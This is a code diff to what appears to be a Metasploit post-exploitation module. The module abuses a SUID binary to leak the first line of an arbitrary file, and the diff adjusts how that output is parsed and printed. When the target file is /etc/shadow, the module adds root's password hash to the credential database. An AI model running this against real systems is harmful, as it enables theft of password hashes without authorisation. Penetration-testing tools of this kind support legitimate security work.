@@ -76,8 +76,7 @@ class MetasploitModule < Msf::Post
 
     flag = Rex::Text.rand_text_alpha 5
     output = cmd_exec("#{suid_bin_path} -dvb #{datastore['FILE']} #{flag}")
-    vprint_good("Output: #{output}")
-    return unless datastore['FILE'] == '/etc/shadow'
+    vprint_good("Raw Command Output: #{output}")
 
     # The first line of the file is cut at 20 characters.
     # If the output is longer than 20 characters, then
@@ -85,10 +84,14 @@ class MetasploitModule < Msf::Post
     # followed by the next 18 characters.
 
     formatted_output = output.scan(/binaries file line: (.+)$/).flatten.map { |line|
-      (line.length == 20) ? line[0..18] : line
+      (line.length == 20) ? line[0..17] : line
     }.join
 
     return if formatted_output.empty?
+
+    print_good("First line of #{datastore['FILE']}: #{formatted_output}")
+
+    return unless datastore['FILE'] == '/etc/shadow'
     print_good("Adding root's hash to the credential database.")
     credential_data = {
       origin_type: :session,
